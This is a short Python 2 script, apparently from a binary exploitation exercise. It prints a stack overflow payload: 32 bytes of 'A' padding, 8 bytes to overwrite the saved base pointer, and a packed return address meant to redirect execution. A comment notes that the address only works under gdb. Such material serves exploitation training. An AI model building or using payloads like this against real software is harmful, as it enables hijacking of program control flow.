import struct
padding = "A"*32
rbp = "BBBBBBBB"
rip = struct.pack("L", 0x555555555159) #running from gdb only!

print padding + rbp + rip
